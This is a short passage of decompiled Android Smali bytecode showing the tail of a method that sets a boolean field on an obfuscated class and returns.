    iput-boolean v2, p0, La_0E958762;->b:Z

    .line 70
    :cond_0
    return-void
.end method
